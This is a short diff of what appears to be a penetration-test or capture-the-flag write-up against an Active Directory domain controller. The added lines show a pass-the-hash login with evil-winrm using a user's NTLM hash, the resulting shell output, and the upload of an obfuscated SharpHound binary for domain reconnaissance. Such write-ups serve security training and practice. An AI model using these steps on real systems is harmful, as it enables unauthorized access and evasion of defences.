@@ -608,5 +608,16 @@ WINRM       10.0.22.198     5985   DC01             [+] hsm.local\bbarkinson:53c
 I can get a session over winrm as this user
 
 ```python
-
+evil-winrm -i DC01.hsm.local -u bbarkinson -H 53c3709ae3d9f4428a230db81361ffbc
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\bbarkinson\Documents> upload SharpHound.exe._obf.exe
 ```
+So ill start by using an obfuscated version of sharphound found below:
+
